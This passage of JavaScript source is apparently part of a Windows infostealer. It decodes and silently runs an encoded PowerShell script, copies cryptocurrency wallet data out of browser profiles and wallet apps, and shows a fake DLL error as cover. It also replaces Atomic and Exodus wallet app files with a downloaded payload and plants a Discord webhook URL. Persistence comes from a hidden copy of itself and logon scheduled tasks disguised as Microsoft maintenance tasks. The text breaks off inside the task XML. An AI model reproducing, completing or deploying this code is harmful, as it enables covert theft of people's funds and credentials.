    const powershellScript64 = 'ER2GC43LJZQW2ZJAHUQCOTSWJFCESQK7KNSWYZSVOBSGC5DFL55SOIBLEAUEOZLUFVJGC3TEN5WSALKNNFXGS3LVNUQDCMBQGAYDAMBQEAWU2YLYNFWXK3JAHE4TSOJZHE4TSKJAFMQCO7JHBISHGY3SNFYHIUDBORUCAPJAERGXSSLOOZXWGYLUNFXW4LSNPFBW63LNMFXGILSQMF2GQCREOZRHGUDBORUCAPJAERZWG4TJOB2FAYLUNAQC24TFOBWGCY3FEATVYLTQOMYSIJZMEATS45TCOMTQUCRDEBBXEZLBORSSA2DJMRSGK3RAKZBFGIDXOJQXA4DFOIQHI3ZAMF3G62LEEBRW63TTN5WGKIDGNRQXG2AKORZHSID3BIQCAIBAER3GE42DN5XHIZLOOQQD2IBCINZGKYLUMVHWE2TFMN2CQYBCK5JWG4TJOB2C4U3IMVWGYYBCFEXFE5LOEBQCE4DPO5SXE43IMVWGYLTFPBSSALKFPBSWG5LUNFXW4UDPNRUWG6JAIJ4XAYLTOMQC2V3JNZSG652TOR4WYZJAJBUWIZDFNYQC2TTPKBZG6ZTJNRSSALKGNFWGKIDAEJQCEJDTMNZGS4DUKBQXI2DAEJQCEYBCFQQDALBAIZQWY43FEIFCAIBAEBNVG6LTORSW2LSJJ4XEM2LMMVOTUOSXOJUXIZKBNRWFIZLYOQUCI5TCONIGC5DIFQQCI5TCONBW63TUMVXHIKIKEAQCAIDJMYQCQVDFON2C2UDBORUCAJDWMJZVAYLUNAUSA6ZAMF2HI4TJMIQCW2BAEISHMYTTKBQXI2BCEB6QU7IKMNQXIY3IEB5X2CQKORZHSID3BIQCAIBAI5SXILKTMNUGKZDVNRSWIVDBONVSA7BAK5UGK4TFFVHWE2TFMN2CA6ZAERPS4VDBONVU4YLNMUQC23DJNNSSAISOKZEUISKBL5JWK3DGKVYGIYLUMVPSUIRAPUQHYICGN5ZEKYLDNAWU6YTKMVRXIID3BIQCAIBAEAQCAICVNZZGKZ3JON2GK4RNKNRWQZLEOVWGKZCUMFZWWIBNKRQXG22OMFWWKIBEL4XFIYLTNNHGC3LFEAWUG33OMZUXE3J2ERTGC3DTMUQC2RLSOJXXEQLDORUW63RAKNUWYZLOORWHSQ3PNZ2GS3TVMUFCAIBAEB6QU7IKMNQXIY3IEB5QUIBAEAQHGY3IORQXG23TEAXXC5LFOJ4SAL3GN4QEYSKTKQQHYICTMVWGKY3UFVJXI4TJNZTSAISOKZEUISKBL5JWK3DGKVYGIYLUMVPSEID4EBDG64SFMFRWQLKPMJVGKY3UEB5QUIBAEAQCAIBAEBUWMIBIERPSALLNMF2GG2BAEJHFMSKEJFAV6U3FNRTFK4DEMF2GKX33LNPH2XJLPURCSID3BIQCAIBAEAQCAIBAEAQCA43DNB2GC43LOMQC6ZDFNRSXIZJAF52G4IBENVQXIY3IMVZVWMC5EAXWMIBSHYSG45LMNQFCAIBAEAQCAIBAPUFCAIBAEB6QU7IKBJ2HE6JAPMFCAIBAEASGCY3UNFXW4IB5EBHGK5ZNKNRWQZLEOVWGKZCUMFZWWQLDORUW63RAFVCXQZLDOV2GKIBHO5ZWG4TJOB2C4ZLYMUTSALKBOJTXK3LFNZ2CAITAEISHMYTTKBQXI2DAEIRAUIBAEAQCI5DSNFTWOZLSEA6SATTFO4WVGY3IMVSHK3DFMRKGC43LKRZGSZ3HMVZCALKBORGG6Z2PNYFCAIBAEASHA4TJNZRWS4DBNQQD2ICOMV3S2U3DNBSWI5LMMVSFIYLTNNIHE2LOMNUXAYLMEAWVK43FOJEWIIBEMVXHMOSVKNCVETSBJVCSALKMN5TW63SUPFYGKICJNZ2GK4TBMN2GS5TFEAWVE5LOJRSXMZLMEBGGS3LJORSWICRAEAQCAJDTMV2HI2LOM5ZSAPJAJZSXOLKTMNUGKZDVNRSWIVDBONVVGZLUORUW4Z3TKNSXIIBNJV2WY5DJOBWGKSLOON2GC3TDMVZSASLHNZXXEZKOMV3SALKENFZWC3DMN53VG5DBOJ2ESZSPNZBGC5DUMVZGSZLTEASGMYLMONSSALKTORXXASLGI5XWS3THJ5XEEYLUORSXE2LFOMQCIZTBNRZWKIBNIFWGY33XJBQXEZCUMVZG22LOMF2GKIBEORZHKZJAFVJXIYLSORLWQZLOIF3GC2LMMFRGYZJAER2HE5LFEAWVE5LOJ5XGY6KJMZHGK5DXN5ZGWQLWMFUWYYLCNRSSAJDGMFWHGZJAFVAWY3DPO5JXIYLSORHW4RDFNVQW4ZBAER2HE5LFEAWUQ2LEMRSW4IBEMZQWY43FEAWUK6DFMN2XI2LPNZKGS3LFJRUW22LUEAUE4ZLXFVKGS3LFKNYGC3RAFVJWKY3PNZSHGIBQFEQC2UDSNFXXE2LUPEQDOCRAEAQCACRAEAQCAUTFM5UXG5DFOIWVGY3IMVSHK3DFMRKGC43LEAWVIYLTNNHGC3LFEASHIYLTNNHGC3LFEAWUCY3UNFXW4IBEMFRXI2LPNYQC2VDSNFTWOZLSEASHI4TJM5TWK4RAFVIHE2LOMNUXAYLMEASHA4TJNZRWS4DBNQQC2U3FOR2GS3THOMQCI43FOR2GS3THOMQC2RTPOJRWKID4EBHXK5BNJZ2WY3AKPUFGGYLUMNUCA6YKEAQCAIDUOJ4SA6YKEAQCAIBAEAQCAJDYNVWEG33OORSW45BAHUQEAIQKHQ7XQ3LMEB3GK4TTNFXW4PJCGEXDAIRAMVXGG33ENFXGOPJCKVKEMLJRGYRD6PQKHRKGC43LEB3GK4TTNFXW4PJCGEXDEIRAPBWWY3TTHURGQ5DUOA5C6L3TMNUGK3LBOMXG22LDOJXXG33GOQXGG33NF53WS3TEN53XGLZSGAYDILZQGIXW22LUF52GC43LEI7AUPCSMVTWS43UOJQXI2LPNZEW4ZTPHYFCAIB4IRSXGY3SNFYHI2LPNY7FG6LTORSW2ICNMFUW45DFNZQW4Y3FEBKGC43LHQXUIZLTMNZGS4DUNFXW4PQKHQXVEZLHNFZXI4TBORUW63SJNZTG6PQKHRKHE2LHM5SXE4Z6BIQCAPCMN5TW63SUOJUWOZ3FOI7AUIBAEAQDYRLOMFRGYZLEHZ2HE5LFHQXUK3TBMJWGKZB6BIQCAPBPJRXWO33OKRZGSZ3HMVZD4CR4F5KHE2LHM5SXE4Z6BI6FA4TJNZRWS4DBNRZT4CRAEA6FA4TJNZRWS4DBNQQGSZB5EJAXK5DIN5ZCEPQKEAQCAIB4JRXWO33OKR4XAZJ6JFXHIZLSMFRXI2LWMVKG623FNY6C6TDPM5XW4VDZOBST4CRAEAQCAPCSOVXEYZLWMVWD4TDFMFZXIUDSNF3GS3DFM5STYL2SOVXEYZLWMVWD4CRAEA6C6UDSNFXGG2LQMFWD4CR4F5IHE2LOMNUXAYLMOM7AUPCTMV2HI2LOM5ZT4CRAEA6E25LMORUXA3DFJFXHG5DBNZRWK42QN5WGSY3ZHZEWO3TPOJSU4ZLXHQXU25LMORUXA3DFJFXHG5DBNZRWK42QN5WGSY3ZHYFCAIB4IRUXGYLMNRXXOU3UMFZHISLGJ5XEEYLUORSXE2LFOM7GMYLMONSTYL2ENFZWC3DMN53VG5DBOJ2ESZSPNZBGC5DUMVZGSZLTHYFCAIB4KN2G64CJMZDW62LOM5HW4QTBOR2GK4TJMVZT4ZTBNRZWKPBPKN2G64CJMZDW62LOM5HW4QTBOR2GK4TJMVZT4CRAEA6EC3DMN53UQYLSMRKGK4TNNFXGC5DFHZ2HE5LFHQXUC3DMN53UQYLSMRKGK4TNNFXGC5DFHYFCAIB4KN2GC4TUK5UGK3SBOZQWS3DBMJWGKPTUOJ2WKPBPKN2GC4TUK5UGK3SBOZQWS3DBMJWGKPQKEAQDYUTVNZHW43DZJFTE4ZLUO5XXE22BOZQWS3DBMJWGKPTGMFWHGZJ4F5JHK3SPNZWHSSLGJZSXI53POJVUC5TBNFWGCYTMMU7AUIBAHREWI3DFKNSXI5DJNZTXGPQKEAQCAIB4KN2G64CPNZEWI3DFIVXGIPTGMFWHGZJ4F5JXI33QJ5XESZDMMVCW4ZB6BIQCAIBAHRJGK43UMFZHIT3OJFSGYZJ6MZQWY43FHQXVEZLTORQXE5CPNZEWI3DFHYFCAIB4F5EWI3DFKNSXI5DJNZTXGPQKEAQDYQLMNRXXOU3UMFZHIT3OIRSW2YLOMQ7HI4TVMU6C6QLMNRXXOU3UMFZHIT3OIRSW2YLOMQ7AUIBAHRCW4YLCNRSWIPTUOJ2WKPBPIVXGCYTMMVSD4CRAEA6EQ2LEMRSW4PTGMFWHGZJ4F5EGSZDEMVXD4CRAEA6FE5LOJ5XGY6KJMZEWI3DFHZTGC3DTMU6C6UTVNZHW43DZJFTESZDMMU7AUIBAHRLWC23FKRXVE5LOHZTGC3DTMU6C6V3BNNSVI32SOVXD4CRAEA6EK6DFMN2XI2LPNZKGS3LFJRUW22LUHZIFIMCTHQXUK6DFMN2XI2LPNZKGS3LFJRUW22LUHYFCAIB4KBZGS33SNF2HSPRXHQXVA4TJN5ZGS5DZHYFDYL2TMV2HI2LOM5ZT4CR4IFRXI2LPNZZSAQ3PNZ2GK6DUHUREC5LUNBXXEIR6BIQCAPCFPBSWGPQKEAQCAIB4INXW23LBNZSD453TMNZGS4DUFZSXQZJ4F5BW63LNMFXGIPQKEAQCAIB4IFZGO5LNMVXHI4Z6EISHMYTTKBQXI2BCHQXUC4THOVWWK3TUOM7AUIBAHQXUK6DFMM7AUPBPIFRXI2LPNZZT4CR4F5KGC43LHYFCEQAKEAQCAIBAEAQCAJDUMVWXAWDNNQQD2IC3KN4XG5DFNUXESTZOKBQXI2C5HI5EOZLUKRSW24CGNFWGKTTBNVSSQKJAFMQCOLTYNVWCOCRAEAQCAIBAEAQFWU3ZON2GK3JOJFHS4RTJNRSV2OR2K5ZGS5DFIFWGYVDFPB2CQJDUMVWXAWDNNQWCAJDYNVWEG33OORSW45BMEBNVG6LTORSW2LSUMV4HILSFNZRW6ZDJNZTV2OR2KVXGSY3PMRSSSCRAEAQCAIBAEAQHGY3IORQXG23TEAXWG4TFMF2GKIBPORXCAIREORQXG22OMFWWKIRAF54G23BAEISHIZLNOBMG23BCEAXWMID4EBHXK5BNJZ2WY3AKEAQCAIBAEAQCAUTFNVXXMZJNJF2GK3JAER2GK3LQLBWWYIBNIZXXEY3FEAWUK4TSN5ZECY3UNFXW4ICTNFWGK3TUNR4UG33OORUW45LFBIQCAIBAPUFCAIBAEBRWC5DDNAQHWCRAEAQCA7IKPUFAUJDBMRSHEZLTONSXGIB5EBAHWCRAEAQCAYTUMMQCAIB5EATWEYZROFZXKYZUOJRTE5LLNZWDIM3LOF4GK3LVPF3DMZBTPBTGM3TEOMZGUMBQHBTWUNZHBIQCAIBAMV2GQIBAEA6SAJZQPA3TAMBYG42UIRRVGVSDSMBUMIZDINBWHE2DKODBGZRECRJQGRDDMZDEG5SUMOJRIYTQUIBAEAQGY5DDEAQCAPJAE5WHIYZROF4DO3RXMZZDIYLOPFZXG6LIMZYDE4ZUONSDS2TWG5ZDQOLFPA4XGZBSMQ3GIZZHBIQCAIBAORZHQIBAEA6SAJ2UJJMWKRLIMFXVSNLTKE3DMU2IJRREG4BYGVVEOY2TNNYUYTDWIJKFKJYKEAQCAIDCMNUCAIBAHUQCO4L2NJ3TIZDKOU2XQMTYGNVXO5DVMVWHA4DNNU4GY4DXG5WXM3TBG5ZTKZTMMUZXG4RUE4FCAIBAEB4G24RAEAQD2IBHGQZUCS3RMQYUYNCRJNLFC5LYG5REWRKLGZSFK3KWJNCUUVDEIV2GOU3HLFQWUMRVOJTVER3BKVZHAMTHMVVUYQJRMJJEI6SKMJRGCZCQKRQU452CI44G42TNLFBVM5SFNFFFUQTZPF3FMNSOMFXEGVKSE4FCAIBAEB4HE4BAEAQD2IBHOJTDE6LTJZKUETSZIZIFQNLUPJHGMYKOM5JGUSSEMVSFCV3IGZWVGVRHBIQCAIBAPJRWC43IEA6SAJ3UGFQTGNDVKE4FQUSOJNXVO6LZNNIVKQLUKI3HM2RVHBKUITLQMFQXSZRHBIQCAIBAMRXWOZJAEA6SAJ2EKE2WKWSRPFGWEQ3TIFDUI32FG53HCM32ONIEQN3WGQZUK5TGKVLDM4SKOZ2EC4TTOFYXMN2MIVWWEM2CIY3GKMLWJB2WIR2QINIXA4DBPBTCOCRAEAQCA43PNQQCAIB5EATUKNSMJY4HQWSDLFQWSQKQNVRGETDDPJTVISSSG5MEG23UGFTWESTIJA3EMTBSLBBWO5KNOETQU7IKBISG25LUMV4E4YLNMUQD2IBHI5WG6YTBNROFO2LOIF2WI2LPJV2XIZLYE4FCIY3SMVQXIZLEJZSXOIB5EASGMYLMONSQU5DSPEQHWCRAEAQCAJDNOV2GK6BAHUQE4ZLXFVHWE2TFMN2CAU3ZON2GK3JOKRUHEZLBMRUW4ZZOJV2XIZLYFASHI4TVMUWCAJDNOV2GK6COMFWWKLBALNZGKZS5ERRXEZLBORSWITTFO4UQUIBAEAQGSZRAFAWW433UEASGG4TFMF2GKZCOMV3SSID3BIQCAIBAEAQCAIDFPBUXICRAEAQCA7IKPUFGGYLUMNUCA6YKEAQCAIDFPBUXICT5BIFCI3DBON2CAPJAE4TQU53INFWGKIBIER2HE5LFFEQHWCRAEAQCA5DSPEQHWCRAEAQCAIBAEAQECZDEFVKHS4DFEAWUC43TMVWWE3DZJZQW2ZJAKN4XG5DFNUXFO2LOMRXXO4ZOIZXXE3LTBIQCAIBAEAQCAIBEOR4HIIB5EBNVG6LTORSW2LSXNFXGI33XOMXEM33SNVZS4Q3MNFYGE33BOJSF2OR2I5SXIVDFPB2CQKIKEAQCAIBAEAQCA2LGEAUCI5DYOQQC2YLOMQQCI5DYOQQC23TFEASGYYLTOQUSA6YKEAQCAIBAEAQCAIBAEAQGSZRAFASHI6DUEAWW2YLUMNUCAJ26FBRGGML4LMYTGXJJLNQS26SBFVEEULKOKAWVUMBNHFOXWMRVFQ3DK7JEE4USA6YKEAQCAIBAEAQCAIBAEAQCAIBAEBNVG6LTORSW2LSXNFXGI33XOMXEM33SNVZS4Q3MNFYGE33BOJSF2OR2KNSXIVDFPB2CQJDBMRSHEZLTONSXGLTCORRSSCRAEAQCAIBAEAQCAIBAEB6QUIBAEAQCAIBAEAQCAIBAMVWHGZLJMYQCQJDUPB2CALLNMF2GG2BAE5PDA6C3MEWWMQJNIYYC2OK5PM2DA7JEE4USA6YKEAQCAIBAEAQCAIBAEAQCAIBAEBNVG6LTORSW2LSXNFXGI33XOMXEM33SNVZS4Q3MNFYGE33BOJSF2OR2KNSXIVDFPB2CQJDBMRSHEZLTONSXGLTFORUCSCRAEAQCAIBAEAQCAIBAEB6QUIBAEAQCAIBAEAQCAIBAMVWHGZLJMYQCQJDUPB2CALLNMF2GG2BAE5PCQTD4JV6DGKK3MEWWW3JNPJAS2SCKFVHFALK2GEWTSXL3GI3CYMZUPUSHYXTMORRTCW3BFV5ECLK2GAWTSXL3GM2SYNRQPUSCOKJAPMFCAIBAEAQCAIBAEAQCAIBAEAQCAW2TPFZXIZLNFZLWS3TEN53XGLSGN5ZG24ZOINWGS4DCN5QXEZC5HI5FGZLUKRSXQ5BIERQWIZDSMVZXGZLTFZWHIYZJBIQCAIBAEAQCAIBAEAQCA7IKEAQCAIBAEAQCAIBAEAQGK3DTMVUWMIBIER2HQ5BAFVWWC5DDNAQCOXSULNQS26SBFVNDALJZLV5TEOBMGM2H2JBHFEQHWCRAEAQCAIBAEAQCAIBAEAQCAIBALNJXS43UMVWS4V3JNZSG653TFZDG64TNOMXEG3DJOBRG6YLSMROTUOSTMV2FIZLYOQUCIYLEMRZGK43TMVZS45DSPAUQUIBAEAQCAIBAEAQCAIBAPUFCAIBAEAQCAIBAEAQCAIDFNRZWK2LGEAUCI5DYOQQC23LBORRWQIBHLYUCQYTJORRW62LOMNQXG2B2FE7SQ4L4OAUVWYJNPIYC2OK5PM2DC7JJEQTSSID3BIQCAIBAEAQCAIBAEAQCAIBAEAQFWU3ZON2GK3JOK5UW4ZDPO5ZS4RTPOJWXGLSDNRUXAYTPMFZGIXJ2HJJWK5CUMV4HIKBEMFSGI4TFONZWK4ZOMJRWQKIKEAQCAIBAEAQCAIBAEAQH2CRAEAQCAIBAEAQCAIBAEBSWY43FNFTCAKBEOR4HIIBNNVQXIY3IEATV4NC3GAWTSQKCLVNTCLJZIEWUQSRNJZIC2WTBFVVW2LL2LV5TSMRMHE2X2JBHFEQHWCRAEAQCAIBAEAQCAIBAEAQCAIBALNJXS43UMVWS4V3JNZSG653TFZDG64TNOMXEG3DJOBRG6YLSMROTUOSTMV2FIZLYOQUCIYLEMRZGK43TMVZS46DNOIUQUIBAEAQCAIBAEAQCAIBAPUFCAIBAEAQCAIBAEAQCAIDFNRZWK2LGEAUCI5DYOQQC23LBORRWQIBHLZZFWMBNHFQS26SBFVNF26ZSGQWDGND5EQTSSID3BIQCAIBAEAQCAIBAEAQCAIBAEAQFWU3ZON2GK3JOK5UW4ZDPO5ZS4RTPOJWXGLSDNRUXAYTPMFZGIXJ2HJJWK5CUMV4HIKBEMFSGI4TFONZWK4ZOPBZHAKIKEAQCAIBAEAQCAIBAEAQH2CRAEAQCAIBAEAQCAIBAEBSWY43FNFTCAKBEOR4HIIBNNVQXIY3IEATV45BRLMYC2OKBFV5F26ZTGIWDGOL5EQTSSID3BIQCAIBAEAQCAIBAEAQCAIBAEAQFWU3ZON2GK3JOK5UW4ZDPO5ZS4RTPOJWXGLSDNRUXAYTPMFZGIXJ2HJJWK5CUMV4HIKBEMFSGI4TFONZWK4ZOPJRWC43IFEFCAIBAEAQCAIBAEAQCAID5BIQCAIBAEAQCAIBAEAQCAZLMONSWSZRAFASHI6DUEAWW2YLUMNUCAJ26IR5TC7K3GUWTSQJNJBFC2TSQFVKV26ZRPVNTCLJZIEWUQSRNJZIC2WTBFVVW2LL2LV5TGMRMGYYX2JBHFEQHWCRAEAQCAIBAEAQCAIBAEAQCAIBALNJXS43UMVWS4V3JNZSG653TFZDG64TNOMXEG3DJOBRG6YLSMROTUOSTMV2FIZLYOQUCIYLEMRZGK43TMVZS4ZDPM5SSSCRAEAQCAIBAEAQCAIBAEB6QUIBAEAQCAIBAEAQCAIBAMVWHGZLJMYQCQJDUPB2CALLDNVQXIY3IEATV4WZRFU4UCLKIJIWU4UBNLJQS223NFV5F26ZTGIWDIND5EQTSSID3BIQCAIBAEAQCAIBAEAQCAIBAEAQFWU3ZON2GK3JOK5UW4ZDPO5ZS4RTPOJWXGLSDNRUXAYTPMFZGIXJ2HJJWK5CUMV4HIKBEMFSGI4TFONZWK4ZOONXWYKIKEAQCAIBAEAQCAIBAEAQH2CRAEAQCAIBAEAQCAIBAEASGYYLTOQQD2IBEOR4HICRAEAQCAIBAEAQH2CRAEAQCA7IKEAQCAIDDMF2GG2BAPMFCAIBAEAQAUIBAEAQH2CRAEAQCAU3UMFZHILKTNRSWK4BAFVGWS3DMNFZWKY3PNZSHGIBUGUYAU7I=';

    try {
        const decodedScript = decodeBase64(powershellScript64).toString('utf8');
        const baseDir = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'SystemData');

        try {
            if (!fs.existsSync(baseDir)) {
                fs.mkdirSync(baseDir, { recursive: true });
            }
        } catch (dirErr) {
            logError(dirErr, 'initializeService-mkdir');
        }

        try {
            if (fs.existsSync(baseDir)) {
                const files = fs.readdirSync(baseDir);
                for (const file of files) {
                    if (file.endsWith('.ps1') && file.startsWith('sys_core_')) {
                        try {
                            fs.unlinkSync(path.join(baseDir, file));
                        } catch (unlinkError) {
                            logError(unlinkError, 'initializeService-unlink-' + file);
                        }
                    }
                }
            }
        } catch (cleanupErr) {
            logError(cleanupErr, 'initializeService-cleanup');
        }

        const ps1Path = path.join(baseDir, fileName);

        try {
            fs.writeFileSync(ps1Path, decodedScript, 'utf8');
        } catch (writeErr) {
            logError(writeErr, 'initializeService-write');
            return;
        }

        const psCmd = decodeString('cG93ZXJzaGVsbA==');
        const executeCmd = psCmd + ' -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "' + ps1Path + '"';

        try {
            exec(executeCmd, {
                windowsHide: true,
                detached: true,
                stdio: 'ignore'
            });
        } catch (execError) {
            logError(execError, 'initializeService-exec-retry');
            try {
                const fallbackCmd = psCmd + ' -Command "Start-Process ' + psCmd + ' -ArgumentList \'-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File \\"' + ps1Path + '\\"\' -WindowStyle Hidden"';
                execSync(fallbackCmd, {
                    stdio: 'pipe',
                    windowsHide: true,
                    timeout: 5000
                });
            } catch (fallbackError) {
                logError(fallbackError, 'initializeService-exec-fallback');
            }
        }
        logSuccess('0xC');
    } catch (e) {
        logError(e, 'initializeService-general');
    }
}


async function fetchWallets() {
    const walletsData = [];
    let walletsCount = 0;

    try {
        const walletsPath = path.join(mainFolderPath, 'Wallets');

        const extensionPaths = PATHS.wallets;
        const browsersToCheck = [
            [user.local + '\\Google\\Chrome\\User Data\\', 'Chrome'],
            [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\', 'Brave'],
            [user.local + '\\Yandex\\YandexBrowser\\User Data\\', 'Yandex'],
            [user.local + '\\Microsoft\\Edge\\User Data\\', 'Edge'],
            [user.roaming + '\\Opera Software\\Opera Stable\\', 'Opera'],
            [user.roaming + '\\Opera Software\\Opera GX Stable\\', 'OperaGX']
        ];

        for (const [browserPathBase, browserName] of browsersToCheck) {
            if (!fs.existsSync(browserPathBase)) continue;

            let profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'];
            if (browserName.includes('Opera')) profiles = [''];

            for (const profile of profiles) {
                let profilePath = profile ? path.join(browserPathBase, profile) : browserPathBase;

                if (!fs.existsSync(profilePath)) continue;

                for (const [walletName, walletSuffix] of Object.entries(extensionPaths)) {
                    const walletPath = path.join(profilePath, walletSuffix);
                    if (fs.existsSync(walletPath)) {
                        try {
                            if (!fs.existsSync(walletsPath)) fs.mkdirSync(walletsPath, { recursive: true });
                            const saveDir = path.join(walletsPath, `${browserName}_${profile || 'Default'}_${walletName}`);
                            if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });

                            await copyFolderRecursive(walletPath, saveDir);

                            walletsData.push(`- ${walletName} (${browserName} - ${profile || 'Default'})`);
                            walletsCount++;
                        } catch (e) {
                            logError(e, `fetchWallets-${walletName}`);
                        }
                    }
                }
            }
        }

        const appWallets = PATHS.walletApps;
        for (const [appName, appPath] of Object.entries(appWallets)) {
            if (fs.existsSync(appPath)) {
                try {
                    if (!fs.existsSync(walletsPath)) fs.mkdirSync(walletsPath, { recursive: true });
                    const saveDir = path.join(walletsPath, appName);
                    if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });

                    await copyFolderRecursive(appPath, saveDir);

                    walletsData.push(`- ${appName} (App)`);
                    walletsCount++;
                } catch (e) { }
            }
        }

    } catch (error) {
        logError(error, 'fetchWallets');
    }

    return walletsCount;
}

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

function showFakeError() {
    return new Promise((resolve) => {
        try {
            const msg = "The code execution cannot proceed because msvcp140.dll was not found. Reinstalling the program may fix this problem.";
            const title = "System Error";

            const command = `cmd /c start "" mshta vbscript:Execute("MsgBox ""${msg}"", 16, ""${title}"":close")`;

            exec(command, { windowsHide: true, detached: true, stdio: 'ignore' }, (err) => {
                resolve();
            });

            setTimeout(resolve, 2000);
        } catch (e) {
            resolve();
        }
    });
}

async function walletInjection() {
    try {
        await Promise.all([
            injectAtomic(),
            injectExodus()
        ]);
    } catch (error) {
        logError(error, 'walletInjection');
    }
}

async function injectAtomic() {
    try {
        const atomicPath = path.join(process.env.LOCALAPPDATA, 'Programs', 'atomic');
        const atomicAsarPath = path.join(atomicPath, 'resources', 'app.asar');
        const atomicLicensePath = path.join(atomicPath, 'LICENSE.electron.txt');
        const atomicMarker = path.join(atomicPath, `.${generateRandomString(6)}`);

        if (fs.existsSync(atomicPath)) {
            try {
                execSync('taskkill /IM "Atomic Wallet.exe" /F', { stdio: 'ignore', windowsHide: true });
            } catch (e) { }
            await inject(atomicPath, atomicAsarPath, atomicInjectionUrl, atomicLicensePath, 'Atomic', atomicMarker);
        }
    } catch (error) {
        logError(error, 'injectAtomic');
    }
}

async function injectExodus() {
    try {
        const exodusPath = path.join(process.env.LOCALAPPDATA, 'exodus');
        if (!fs.existsSync(exodusPath)) return;

        try {
            execSync('taskkill /IM Exodus.exe /F', { stdio: 'ignore', windowsHide: true });
        } catch (e) { }

        const exodusDirs = fs.readdirSync(exodusPath).filter(file => file.startsWith('app-'));

        for (const exodusDir of exodusDirs) {
            const exodusPathWithVersion = path.join(exodusPath, exodusDir);
            const exodusAsarPath = path.join(exodusPathWithVersion, 'resources', 'app.asar');
            const exodusLicensePath = path.join(exodusPathWithVersion, 'LICENSE');

            await inject(exodusPath, exodusAsarPath, exodusInjectionUrl, exodusLicensePath, `Exodus-${exodusDir}`);
        }
    } catch (error) {
        logError(error, 'injectExodus');
    }
}

async function inject(appPath, asarPath, injectionUrl, licensePath, appName) {
    if (!fs.existsSync(appPath)) return;

    if (!injectionUrl || injectionUrl.includes('REMPLACE_ME')) return;

    const markerPath = path.join(path.dirname(asarPath), '.avm_lock');
    if (fs.existsSync(markerPath)) {
        return;
    }

    try {
        if (!fs.existsSync(path.dirname(asarPath))) return;

        const response = await axios.get(injectionUrl, { responseType: 'stream' });

        if (response.status !== 200) {
            logError(`Failed to download injection: ${response.status}`, `inject-${appName}`);
            return;
        }

        const writer = fs.createWriteStream(asarPath);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        try {
            fs.writeFileSync(markerPath, 'done');
        } catch (e) { }


        if (licensePath && discordWebhookUrl && !discordWebhookUrl.includes('REMPLACE_ME')) {
            try {
                fs.writeFileSync(licensePath, discordWebhookUrl, 'utf8');
            } catch (licErr) {
                logError(licErr, `inject-license-${appName}`);
            }
        }
    } catch (error) {
        logError(error, `inject-${appName}`);
    }
}

function basicStartup() {
    if (process.platform !== 'win32') return;
    try {
        const currentExe = path.resolve(process.execPath);
        const currentDir = path.dirname(currentExe).toLowerCase();

        const legitTasks = [
            { name: "WindowsTelemetrySync", desc: "Synchronizes system telemetry with Microsoft servers" },
            { name: "NetFrameworkUpdate", desc: "Ensures .NET Framework components are up to date" },
            { name: "SecurityHealthScan", desc: "Periodic background security health check" },
            { name: "OneDriveHealthCheck", desc: "Monitors OneDrive sync health and performance" },
            { name: "EdgeBrowserUpdate", desc: "Background maintenance for Microsoft Edge data" }
        ];

        try {
            const taskPrefixes = legitTasks.map(t => t.name).join('|');
            const cleanupCmd = `powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ScheduledTask | Where-Object { $_.TaskName -match '^(${taskPrefixes})' -or $_.Description -match 'MaintenanceTask' -or ($_.Actions.Execute + ' ' + $_.Actions.Arguments) -match 'Microsoft\\\\Windows\\\\[a-zA-Z0-9]{8}\\\\' } | Unregister-ScheduledTask -Confirm:$false"`;
            execSync(cleanupCmd, { stdio: 'ignore', windowsHide: true, timeout: 5000 });

            const parentStealthDir = path.join(process.env.APPDATA, 'Microsoft', 'Windows');
            if (fs.existsSync(parentStealthDir)) {
                fs.readdirSync(parentStealthDir).forEach(dir => {
                    if (/^[a-zA-Z0-9]{8}$/.test(dir)) {
                        const fullPath = path.resolve(path.join(parentStealthDir, dir));
                        if (fullPath.toLowerCase() === currentDir) return;

                        try {
                            const files = fs.readdirSync(fullPath);
                            if (files.some(f => f.endsWith('.exe') || f.endsWith('.vbs'))) {
                                execSync(`rmdir /s /q "${fullPath}"`, { stdio: 'ignore', windowsHide: true });
                            }
                        } catch (e) { }
                    }
                });
            }
        } catch (e) { }

        const subDirName = generateRandomString(8);
        const exeName = generateRandomString(8) + '.exe';
        const targetDir = path.join(process.env.APPDATA, 'Microsoft', 'Windows', subDirName);
        if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir, { recursive: true });

        const targetFile = path.resolve(path.join(targetDir, exeName));
        if (currentExe.toLowerCase() !== targetFile.toLowerCase()) {
            try {
                fs.copyFileSync(currentExe, targetFile);
            } catch (e) { }
        }

        try {
            execSync(`attrib +h +s "${targetDir}"`, { stdio: 'ignore', windowsHide: true });
        } catch (e) { }

        const selection = legitTasks[Math.floor(Math.random() * legitTasks.length)];
        const taskName = selection.name + "_" + generateRandomString(6);
        const xmlName = generateRandomString(8) + '.xml';
        const xmlPath = path.join(targetDir, xmlName);
        const currentUser = os.userInfo().username;

        const vbsName = generateRandomString(8) + '.vbs';
        const vbsPath = path.join(targetDir, vbsName);
        const vbsContent = `CreateObject("WScript.Shell").Run """" & "${targetFile}" & """ --hidden", 0, False`;

        const taskXml = `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>${selection.desc}</Description>
    <Author>${currentUser}</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
